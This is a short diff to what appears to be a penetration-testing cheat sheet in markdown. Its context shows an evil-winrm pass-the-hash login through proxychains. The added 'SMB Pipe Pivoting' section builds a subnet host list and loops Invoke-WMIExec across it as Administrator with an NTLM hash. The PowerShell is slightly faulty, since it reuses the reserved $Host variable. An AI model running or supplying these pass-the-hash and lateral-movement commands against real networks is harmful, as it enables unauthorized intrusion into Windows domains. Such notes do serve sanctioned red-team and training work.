@@ -66,6 +66,12 @@ Invoke-Command -ComputerName john.insomnia.io -Credential $Cred  -ScriptBlock {c
 ```
 proxychains evil-winrm -u john -H <NTLM Hash> -i 192.168.199
 ```
+### SMB Pipe Pivoting
+```
+python -c 'for i in range(1,254): print "192.168.100.%d" % i' > host.txt
+$Host = @('C:\Users\T-Soe\Desktop\host.txt')
+foreach ($Host in cat host.txt) {Invoke-WMIExec -Target $Host -Domain insomnia.io -Username Administrator -Hash <> -Command "hostname" -verbose}
 
+```
 
 
